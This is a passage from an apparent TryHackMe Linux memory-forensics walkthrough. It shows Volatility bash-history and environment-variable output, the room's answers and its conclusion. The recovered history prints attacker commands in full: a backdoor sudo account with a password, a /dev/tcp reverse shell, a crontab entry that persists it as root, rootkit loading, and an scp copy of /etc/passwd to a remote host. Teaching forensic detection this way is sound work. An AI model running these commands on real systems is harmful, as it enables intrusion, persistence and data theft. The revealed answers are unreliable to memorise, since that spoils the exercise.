ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.bash.BashVolatility 3 Framework 2.26.2PID    Process    CommandTime    Command14165    bash    2025-06-02 10:12:47.000000 UTC    useradd [REDACTED] -m -s /bin/bash14165    bash    2025-06-02 10:13:07.000000 UTC    /sbin/useradd [REDACTED] -m -s /bin/bash14165    bash    2025-06-02 10:13:10.000000 UTC    sudo su14204    bash    2025-06-02 10:13:35.000000 UTC    /sbin/useradd [REDACTED] -m -s /bin/bash14204    bash    2025-06-02 10:14:19.000000 UTC    echo '[REDACTED]secretP2ssw0rd!' | chpasswd14204    bash    2025-06-02 10:14:33.000000 UTC    usermod -aG sudo [REDACTED]14204    bash    2025-06-02 10:15:02.000000 UTC    mkdir /home/[REDACTED]/.ssh14204    bash    2025-06-02 10:15:53.000000 UTC    sudo su - [REDACTED]14204    bash    2025-06-02 10:34:33.000000 UTC    bash -i >& /dev/tcp/10.[REDACTED]/4567 0>&114204    bash    2025-06-02 10:51:34.000000 UTC    mkdir /tmp14204    bash    2025-06-02 10:51:41.000000 UTC    cd /tmp/14204    bash    2025-06-02 10:51:42.000000 UTC    ls14801    bash    2025-06-02 10:36:23.000000 UTC    sudo su14801    bash    2025-06-02 10:36:23.000000 UTC    Pf[14847    bash    2025-06-02 10:36:27.000000 UTC    echo "* * * * * root bash -i >& /dev/tcp/10.[REDACTED]/4567 0>&1" >> /etc/crontab14847    bash    2025-06-02 10:37:02.000000 UTC    isnmod rootkit.ko14847    bash    2025-06-02 10:37:11.000000 UTC    insmod rootkit.ko14847    bash    2025-06-02 10:39:46.000000 UTC    chmod +x /dev/shm/.runme.sh14847    bash    2025-06-02 10:39:51.000000 UTC    /dev/shm/.runme.sh14847    bash    2025-06-02 10:41:17.000000 UTC    scp /etc/passwd root@10.10.34.91:/home/
```

   The command's output is already placed in the `bash_output` file. The output shows the commands the user ran in the bash terminal. Some of the suspicious commands executed were related to suspicious account creation, SSH setup, setting up a cron job, etc.

 **Forensics Value**

 
- Reveals attacker behavior in plaintext.
- Identifies credential theft, persistence mechanisms, and payload execution.
- Even if history is wiped from disk, memory can preserve it.

 Check Environment Variables We can also extract the traces of the environment variables from the memory. This may be useful if the attacker has planted suspicious binaries in a custom location and altered the PATH variable to prioritize the execution.

 **Command:**  `vol3 -f FS-01.mem linux.envars.Envars`

   Checking Environment variables 
```Checking Environment variables 
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.envars.EnvarsVolatility 3 Framework 2.26.2PID    PPID    COMM    KEY    VALUE1    0    systemd    HOME    /1    0    systemd    TERM    linux1    0    systemd    BOOT_IMAGE    /boot/vmlinuz-5.15.0-1066-aws170    1    systemd-journal    LANG    C.UTF-8170    1    systemd-journal    PATH    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin170    1    systemd-journal    NOTIFY_SOCKET    /run/systemd/notify
```

   The command's output is already placed in the `envars_output` file.

 **Forensics Value:**

 
- Reveals execution context of processes, including directories, shells, and user settings.
- Detects malicious environment manipulation, such as modified `PATH`.
- Uncovers persistence mechanisms through environment-based startup configurations.
- Correlates with other process artifacts to enrich the investigation context.

 In conclusion, understanding user behavior is critical for identifying unauthorized access, malicious actions, and post-exploitation traces.

### **Answer the questions below**

**Question:** The network team has detected a suspicious attempt to create a new account on the system. Can you investigate and find the name of the backdoor account created?

*Answer:* 

     james

**Question:** The bash history shows a suspicious command that established a reverse shell. What is the attacker's IP address?

*Answer:* 

     10.12.14.32

---

## Task 8 | Conclusion

That's it.

 In this room, we examined a Linux memory dump to look for the footprints of the adversary on the compromised Linux host. Some of the key points we covered are:

 
- Identify suspicious process.
- Identify the hidden process running from the tmp directory.
- Examine the processes with suspicious arguments.
- Examine the bash history.
- Explore network connections and identify reverse shell connections.

 You can learn more about forensics in the following rooms:

 
- [Linux Logs Investigation](https://tryhackme.com/r/room/linuxlogsinvestigations)
- [Linux Process Analysis](https://tryhackme.com/room/linuxprocessanalysis)
- [Linux Forensics](https://tryhackme.com/r/room/linuxforensics)

 Happy Learning!

### **Answer the questions below**

**Question:** Continue to complete the room.

*Answer:* 

     No answer needed

**Question:** Don't forget to close the machine attached to the room.

*Answer:* 

     No answer needed

---

{% endraw %}
